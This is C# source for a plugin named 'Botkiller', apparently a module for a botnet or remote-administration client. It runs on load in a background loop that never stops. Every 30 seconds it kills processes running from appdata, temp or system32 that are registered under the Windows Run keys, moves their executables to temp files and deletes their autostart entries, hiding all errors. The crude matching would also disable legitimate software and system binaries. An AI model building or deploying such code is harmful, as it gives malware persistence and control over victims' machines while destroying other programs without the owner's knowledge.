using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;

namespace Botkiller
{
    public class Class1 : XPlugin
    {
        public override string Author
        {
            get { return "xSilent"; }
        }

        public override string Description
        {
            get { return "Kills most common bot clients"; }
        }

        public override bool ExecuteOnLoad
        {
            get { return true; }
        }

        public override bool HasForm
        {
            get { return false; }
        }

        public override void Initialize()
        {
            state = PluginState.NONE;
        }

        public override System.Windows.Forms.Form InputForm
        {
            get { return null; }
        }

        public override string Name
        {
            get { return "Botkiller"; }
        }

        PluginState state;
        public override PluginState State
        {
            get { return state; }
        }

        public override bool StopOnDisconnection
        {
            get { return false; }
        }

        public override Version Version
        {
            get { return new Version(1, 0, 0, 0); }
        }

        public override void Execute(PluginArgs e)
        {
            state = PluginState.RUNNING;

            new Thread(delegate()
                {
                    scan();
                }).Start();
            base.Execute(e);
        }

        void scan()
        {
            while (true)
            {
                    Process[] procs = Process.GetProcesses();
                    for (int i = 0; i < procs.Length; i++)
                    {
                        try
                        {
                            Process proc = procs[i];

                            string fn = proc.MainModule.FileName;

                            if (fn.ToLower().Contains("appdata") || fn.ToLower().Contains("temp") || fn.ToLower().Contains("system32"))
                            {
                                string nameOut = string.Empty;
                                if (CheckReg(RegistryHive.CurrentUser, fn, out nameOut))
                                {
                                    Kill(proc, fn, RegistryHive.CurrentUser, nameOut);
                                }
                                if (CheckReg(RegistryHive.LocalMachine, fn, out nameOut))
                                {
                                    Kill(proc, fn, RegistryHive.LocalMachine, nameOut);
                                }
                            }
                        }
                        catch
                        {
                        }
                    }

                Thread.Sleep(30000);
            }
        }

        bool CheckReg(RegistryHive hive, string fileName, out string name)
        {
            RegistryKey key = null;

            switch (hive)
            {
                case RegistryHive.CurrentUser:
                    key = Registry.CurrentUser;
                    break;
                default:
                    key = Registry.LocalMachine;
                    break;
            }

            key = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            string[] names = key.GetValueNames();

            for (int i = 0; i < names.Length; i++)
            {
                if (key.GetValue(names[i]) != null && key.GetValue(names[i]).ToString().ToLower() == fileName.ToLower())
                {
                    name = names[i];
                    return true;
                }
            }
            name = null;
            return false;
        }
        void Kill(Process proc, string fileName, RegistryHive hive, string regName)
        {
            try
            {
                proc.Kill();
                string tempName = Path.GetTempFileName();
                try
                {

                    File.Delete(tempName);
                }
                catch
                {
                }

                File.Move(fileName, tempName.Replace(".tmp", ".exe"));
                try
                {
                    File.Delete(tempName);
                }
                catch { }
                RegistryKey key = null;

                switch (hive)
                {
                    case RegistryHive.CurrentUser:
                        key = Registry.CurrentUser;
                        break;
                    default:
                        key = Registry.LocalMachine;
                        break;
                }

                key = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                key.DeleteValue(regName);

            }
            catch
            {
            }
        }
    }
}
